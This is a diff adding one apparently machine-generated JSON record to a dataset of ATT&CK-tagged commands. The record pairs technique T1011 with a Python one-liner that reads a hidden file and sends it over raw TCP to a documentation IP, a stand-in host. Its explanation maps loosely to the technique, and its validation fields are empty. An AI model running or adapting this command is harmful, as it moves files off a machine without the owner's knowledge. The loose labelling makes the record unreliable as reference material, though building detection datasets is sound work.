@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.88\", 52689)); d=open(\"/Users/Shared/.rpt\",\"rb\").read(); s.sendall(struct.pack(\"!I\",len(d))+d); s.close()'",
+  "explanation": "Uses a custom length-prefixed payload over a high, uncommon TCP port to simulate an alternate application-layer medium rather than a standard C2 channel, consistent with T1011.",
+  "rationale_steps": [
+    "Open a TCP socket to a documentation IP on a non-standard port (52689).",
+    "Prefix data with a 4-byte big-endian length for simple reassembly.",
+    "Transmit over a custom TCP stream to represent an alternate medium.",
+    "No obfuscation; user privileges only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-3e5696a3",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
